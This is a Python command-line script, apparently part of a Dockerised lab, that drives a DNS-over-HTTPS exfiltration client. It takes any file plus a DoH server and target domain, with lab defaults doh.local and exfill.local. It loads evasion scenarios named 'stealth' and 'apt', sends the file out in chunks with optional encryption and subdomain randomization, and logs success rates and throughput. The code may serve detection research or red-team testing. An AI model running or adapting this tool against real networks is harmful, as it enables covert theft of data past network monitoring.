#!/usr/bin/env python3
"""
Quick DoH Exfiltration Test with JSON Config Support

Enhanced test script for Docker integration with JSON configuration support.
Allows testing different evasion scenarios through configuration files.
"""

import argparse
import logging
import os
import sys
import time
from pathlib import Path

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

def test_integration_with_config(file_path=None, config_file=None, scenario_name=None):
    """Test DoH exfiltration integration with JSON configuration support"""
    logger.info("🚀 Starting DoH Exfiltration Integration Test")
    
    # Check environment
    doh_server = os.environ.get('DOH_SERVER', 'https://doh.local/dns-query')
    target_domain = os.environ.get('TARGET_DOMAIN', 'exfill.local')
    
    logger.info(f"DoH Server: {doh_server}")
    logger.info(f"Target Domain: {target_domain}")
    
    try:
        # Import our client
        sys.path.append('/app')
        from client import DoHExfiltrationClient, ExfiltrationConfig, EncodingType, TimingPattern
        from json_config_loader import JSONConfigLoader
        
        # Determine which file to use
        test_file = Path(file_path)
        if not test_file.exists():
            logger.error(f"❌ File not found: {file_path}")
            return False
        
        # Get file info
        file_size = test_file.stat().st_size
        logger.info(f"📁 Using specified file: {test_file}")
        logger.info(f"📊 File size: {file_size:,} bytes")
        
        # Load configuration
        config = None
        config_source = "adaptive"
        
        if config_file or scenario_name:
            loader = JSONConfigLoader()
            
            if scenario_name:
                # Load full scenario
                logger.info(f"📋 Loading scenario: {scenario_name}")
                scenario = loader.load_test_scenario(scenario_name)
                if scenario:
                    config = scenario['exfiltration_config']
                    config_source = f"scenario '{scenario['name']}'"
                    logger.info(f"📝 Scenario description: {scenario['description']}")
                else:
                    logger.error(f"❌ Failed to load scenario: {scenario_name}")
                    return False
                    
            elif config_file:
                # Load configuration file
                logger.info(f"⚙️ Loading configuration file: {config_file}")
                config = loader.load_config_from_file(config_file)
                if config:
                    config_source = f"config file '{config_file}'"
                else:
                    logger.error(f"❌ Failed to load configuration: {config_file}")
                    return False
                
        # Override with environment variables
        config.doh_server = doh_server
        config.target_domain = target_domain
        
        logger.info(f"⚙️ Configuration loaded from: {config_source}")
        logger.info(f"  - Strategy: {config.timing_pattern.value}")
        logger.info(f"  - Base chunk size: {config.chunk_size}")
        logger.info(f"  - Encoding: {config.encoding.value}")
        logger.info(f"  - Base delay: {config.base_delay}s")
        logger.info(f"  - Compression: {'enabled' if config.compression else 'disabled'}")
        logger.info(f"  - Encryption: {'enabled' if config.encryption else 'disabled'}")
        logger.info(f"  - Randomization: {'enabled' if config.subdomain_randomization else 'disabled'}")
        
        logger.info("Creating DoH exfiltration client...")
        client = DoHExfiltrationClient(config)
        
        logger.info("Starting exfiltration...")
        start_time = time.time()
        success = client.exfiltrate_file(str(test_file))
        end_time = time.time()
        
        if success:
            logger.info("✅ Integration test successful!")
            
            # Show statistics
            stats = client.stats
            duration = end_time - start_time
            
            logger.info("📊 Exfiltration Statistics:")
            logger.info(f"  - File: {test_file.name}")
            logger.info(f"  - Size: {file_size:,} bytes")
            logger.info(f"  - Configuration: {config_source}")
            logger.info(f"  - Total chunks: {stats['total_chunks']}")
            logger.info(f"  - Successful chunks: {stats['successful_chunks']}")
            logger.info(f"  - Failed chunks: {stats['failed_chunks']}")
            logger.info(f"  - Success rate: {(stats['successful_chunks']/stats['total_chunks']*100):.1f}%")
            logger.info(f"  - Total time: {duration:.2f} seconds")
            logger.info(f"  - Average speed: {(file_size/duration/1024):.1f} KB/s")
            
            # Check if any chunks failed
            if stats['failed_chunks'] > 0:
                logger.warning(f"⚠️ {stats['failed_chunks']} chunks failed - data may be incomplete")
            
        else:
            logger.error("❌ Integration test failed!")
            return False
            
    except Exception as e:
        logger.error(f"❌ Integration test error: {e}")
        import traceback
        traceback.print_exc()
        return False
    
    logger.info("🎉 Integration test completed successfully!")
    return True

def main():
    """Main function with enhanced argument parsing"""
    parser = argparse.ArgumentParser(description='DoH Exfiltration Test Script with JSON Config Support')
    parser.add_argument('file', nargs='?', help='File to exfiltrate (required)')
    parser.add_argument('-s', '--server', default=None,
                       help='DoH server URL (default: from DOH_SERVER env var)')
    parser.add_argument('-d', '--domain', default=None,
                       help='Target domain (default: from TARGET_DOMAIN env var)')
    parser.add_argument('-c', '--config', default=None,
                       help='JSON configuration file to use')
    parser.add_argument('--scenario', default=None,
                       help='Predefined scenario name (classic, stealth, burst, apt, speed)')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Enable verbose logging')
    parser.add_argument('--list-scenarios', action='store_true',
                       help='List available scenarios and exit')
    
    args = parser.parse_args()
    
    # Set logging level
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Handle list scenarios
    if args.list_scenarios:
        try:
            sys.path.append('/app')
            from json_config_loader import JSONConfigLoader
            loader = JSONConfigLoader()
            configs = loader.list_available_configs()
            
            print("📋 Available JSON configurations:")
            for config in configs:
                print(f"  • {config}")
                
            print("\n📝 Usage examples:")
            print(f"  python run_client.py --scenario stealth myfile.txt")
            print(f"  python run_client.py --config custom_config.json myfile.txt")
            print(f"  python run_client.py myfile.txt  # Uses adaptive config")
            
        except Exception as e:
            logger.error(f"Error listing scenarios: {e}")
        
        return
    
    # Check if file is provided
    if not args.file:
        logger.error("❌ No file specified to exfiltrate")
        parser.print_help()
        sys.exit(1)
    
    # Override environment variables if specified
    if args.server:
        os.environ['DOH_SERVER'] = args.server
    if args.domain:
        os.environ['TARGET_DOMAIN'] = args.domain
    
    # Run the test
    success = test_integration_with_config(args.file, args.config, args.scenario)
    
    if success:
        logger.info("🎯 Exfiltration completed successfully!")
        logger.info(f"📁 File '{args.file}' has been exfiltrated via DoH")
    else:
        logger.error("❌ Exfiltration failed!")
    
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
